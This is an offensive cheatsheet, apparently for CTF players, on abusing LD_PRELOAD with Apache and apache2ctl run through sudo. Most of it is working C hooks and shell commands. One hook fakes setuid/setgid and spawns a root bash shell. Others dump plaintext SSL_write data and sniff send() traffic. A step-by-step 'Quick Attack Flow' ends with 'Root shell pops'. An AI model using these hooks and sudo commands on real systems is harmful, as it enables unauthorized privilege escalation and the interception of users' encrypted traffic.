

# 🔥 Cheatsheet – LD\_PRELOAD Apache Exploitation

LD\_PRELOAD lets you override libc / library calls in a target binary. With Apache running as root (before dropping privileges), or when `apache2ctl` / `safeapache2ctl` is exploitable via `sudo`, you can preload your malicious `.so` to **intercept calls** or **spawn shells**.

---

## ⚙️ Compilation Basics

Compile a hook into a shared object:

```bash
gcc -fPIC -shared -o hook.so hook.c -ldl
```

Run target with preload:

```bash
LD_PRELOAD=$PWD/hook.so ./target
```

If Apache is run with sudo (via apache2ctl), LD\_PRELOAD can execute your code **as root**.

---

## 🪝 Hook Templates

### 1. **Strcmp hook** (classic CTF trick)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

int strcmp(const char *s1, const char *s2) {
    printf("[LD_PRELOAD] strcmp('%s','%s')\n", s1, s2);
    int (*orig_strcmp)(const char*, const char*) = dlsym(RTLD_NEXT, "strcmp");
    return orig_strcmp(s1, s2);
}
```

---

### 2. **SSL\_write inspector** (dump HTTPS data)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <openssl/ssl.h>

int SSL_write(SSL *ctx, const void *buf, int num) {
    int (*orig_SSL_write)(SSL *, const void *, int);
    orig_SSL_write = dlsym(RTLD_NEXT, "SSL_write");

    // dump plaintext traffic
    write(1, buf, num);
    write(1, "\n---\n", 5);

    return orig_SSL_write(ctx, buf, num);
}
```

---

### 3. **Apache-specific: setuid/setgid hook**

If Apache is started as root, it drops privileges with `setuid()`. We can hook that to keep root:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

int setuid(uid_t uid) {
    // hijack setuid: stay root!
    printf("[LD_PRELOAD] Blocking setuid(%d), staying root.\n", uid);
    return 0; // pretend success
}

int setgid(gid_t gid) {
    printf("[LD_PRELOAD] Blocking setgid(%d), staying root.\n", gid);
    return 0;
}

__attribute__((constructor)) void run_shell() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```

➡ Compile and run Apache with this preload → Apache never drops to `www-data`, your shell stays **root**.

---

### 4. **Apache file write interceptor**

Hook `open()` to dump/redirect sensitive files accessed by Apache:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>

int open(const char *pathname, int flags, ...) {
    int (*orig_open)(const char *, int, ...) = dlsym(RTLD_NEXT, "open");
    printf("[LD_PRELOAD] open('%s')\n", pathname);

    if (strstr(pathname, "httpd.conf")) {
        printf("[LD_PRELOAD] Intercepted Apache config!\n");
    }

    return orig_open(pathname, flags);
}
```

---

### 5. **Apache network sniffer**

Hook `send` to dump HTTP traffic:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <dlfcn.h>

ssize_t send(int sockfd, const void *buf, size_t len, int flags) {
    ssize_t (*orig_send)(int, const void*, size_t, int);
    orig_send = dlsym(RTLD_NEXT, "send");

    printf("[LD_PRELOAD] HTTP send: %.*s\n", (int)len, (char*)buf);
    return orig_send(sockfd, buf, len, flags);
}
```

---

## 🧩 Exploiting Apachectl (CTF Angle)

If `sudo -l` allows:

```
(ALL) NOPASSWD: /usr/local/bin/apache2ctl
```

➡ You can run Apache with your LD\_PRELOAD:

```bash
sudo LD_PRELOAD=/tmp/hook.so apache2ctl -f /etc/apache2/apache2.conf start
```

Because Apache starts as **root**, your hook runs with **root privileges** before it forks/drops to www-data.

---

## 🧹 Cleanup

```bash
rm -f hook.so
unset LD_PRELOAD
```

---

## ⚡ Quick Attack Flow

1. Write hook (e.g. block `setuid` + spawn root shell).
2. Compile:

   ```bash
   gcc -fPIC -shared -o hook.so hook.c -ldl
   ```
3. Run via `sudo apache2ctl` or `safeapache2ctl` with `LD_PRELOAD`:

   ```bash
   sudo LD_PRELOAD=/tmp/hook.so apache2ctl start
   ```
4. Root shell pops. 🎉

---

